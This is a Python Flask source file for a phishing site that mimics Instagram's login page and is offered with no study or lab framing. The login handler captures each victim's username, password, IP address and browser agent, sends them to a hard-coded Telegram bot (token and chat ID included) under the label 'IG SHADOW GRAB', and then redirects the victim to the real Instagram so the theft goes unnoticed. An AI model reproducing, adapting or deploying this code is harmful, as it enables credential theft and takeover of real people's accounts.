import os
import requests
from flask import Flask, request, render_template_string

app = Flask(__name__)

# ========== CONFIG ==========
TELEGRAM_BOT_TOKEN = "8840443558:AAFBW-dKJenVK1XbhCjHkvj_lf1QTFh0caM"
TELEGRAM_CHAT_ID = "6158101156"
REAL_INSTAGRAM_URL = "https://www.instagram.com"
# ============================

HTML_TEMPLATE = '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>
<style>
  * {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
  }

  body {
    background: #1a2535;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
  }

  .lang {
    color: #e0e6f0;
    font-size: 14px;
    margin-top: 18px;
    font-weight: 400;
  }

  .logo-wrap {
    margin-top: 80px;
    margin-bottom: 90px;
  }

  .ig-logo {
    width: 72px;
    height: 72px;
  }

  .form-area {
    width: 100%;
    max-width: 420px;
    padding: 0 28px;
    display: flex;
    flex-direction: column;
    gap: 10px;
  }

  .field {
    width: 100%;
    height: 52px;
    background: transparent;
    border: 1.5px solid #3d4f65;
    border-radius: 10px;
    padding: 0 16px;
    font-size: 15px;
    color: #e8edf3;
    outline: none;
    transition: border-color 0.15s;
  }

  .field::placeholder {
    color: #7a8fa6;
  }

  .field:focus {
    border-color: #6a7f96;
  }

  .login-btn {
    width: 100%;
    height: 52px;
    background: #1877f2;
    border: none;
    border-radius: 10px;
    color: #fff;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    margin-top: 2px;
  }

  .login-btn:active {
    opacity: 0.9;
  }

  .forgot {
    color: #c8d5e3;
    font-size: 14px;
    margin-top: 4px;
    text-decoration: none;
    text-align: center;
    display: block;
  }

  .bottom-area {
    width: 100%;
    max-width: 420px;
    padding: 0 28px;
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 14px;
    position: fixed;
    bottom: 28px;
  }

  .create-btn {
    width: 100%;
    height: 52px;
    background: transparent;
    border: 1.5px solid #3d4f65;
    border-radius: 10px;
    color: #4a9fff;
    font-size: 16px;
    font-weight: 500;
    cursor: pointer;
  }

  .meta-logo {
    display: flex;
    align-items: center;
    gap: 7px;
    color: #c0cdd9;
    font-size: 15px;
    font-weight: 600;
  }

  .meta-icon {
    width: 22px;
    height: 14px;
  }
</style>
</head>
<body>

  <span class="lang">English (US)</span>

  <div class="logo-wrap">
    <svg class="ig-logo" viewBox="0 0 72 72" fill="none" xmlns="http://www.w3.org/2000/svg">
      <defs>
        <linearGradient id="igGrad" x1="72" y1="72" x2="0" y2="0" gradientUnits="userSpaceOnUse">
          <stop offset="0%" stop-color="#ffd600"/>
          <stop offset="25%" stop-color="#ff6930"/>
          <stop offset="55%" stop-color="#e1306c"/>
          <stop offset="100%" stop-color="#833ab4"/>
        </linearGradient>
      </defs>
      <rect width="72" height="72" rx="18" fill="#1a2535"/>
      <rect x="9" y="9" width="54" height="54" rx="15" fill="none" stroke="url(#igGrad)" stroke-width="4"/>
      <circle cx="36" cy="36" r="13.5" fill="none" stroke="url(#igGrad)" stroke-width="4"/>
      <circle cx="52" cy="20" r="3.5" fill="url(#igGrad)"/>
    </svg>
  </div>

  <form method="POST" action="/login">
    <div class="form-area">
      <input class="field" type="text" name="username" placeholder="Username, email or mobile number" autocomplete="off" required />
      <input class="field" type="password" name="password" placeholder="Password" required />
      <button class="login-btn" type="submit">Log in</button>
      <a class="forgot" href="#">Forgot password?</a>
    </div>
  </form>

  <div class="bottom-area">
    <button class="create-btn" onclick="alert('Sign up is temporarily disabled')">Create new account</button>
    <div class="meta-logo">
      <svg class="meta-icon" viewBox="0 0 36 22" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M2 18.5C2 19.88 2.8 21 4 21c1 0 1.7-.5 2.8-2.2L9 15l-2.1-3.3C5.5 9.7 4.8 9 4 9 2.8 9 2 10.1 2 11.5v7z" fill="#c0cdd9"/>
        <path d="M9 15l3.5-5.5C14 7.4 15.2 6.5 16.5 6.5c1.4 0 2.5 1 3.8 3.2L22 12.8l-2.7 4.5C18 19.5 17 21 16.5 21c-.7 0-1.3-.5-2.5-2.5L12 15.5 9 15z" fill="#c0cdd9"/>
        <path d="M22 12.8l1.7-2.9c1.2-2 2.3-3.4 3.8-3.4 1.4 0 2.6 1 3.3 2.8.5 1.1.7 2.4.7 3.7v4.5C31.5 19.7 30.6 21 29 21c-1.2 0-2.1-.9-3.3-3l-3.7-5.2z" fill="#c0cdd9"/>
      </svg>
      <span>Meta</span>
    </div>
  </div>

</body>
</html>'''

def send_to_telegram(data):
    text = f"🔐 IG SHADOW GRAB\n👤 User: {data['username']}\n🔑 Pass: {data['password']}\n🌐 IP: {data['ip']}\n📱 UA: {data['user_agent']}"
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": text}, timeout=5)
    except:
        pass

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    
    data = {
        'username': username,
        'password': password,
        'ip': ip,
        'user_agent': user_agent
    }
    send_to_telegram(data)
    
    # Redirect to real Instagram
    return f'<script>window.location.href="{REAL_INSTAGRAM_URL}"</script>'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
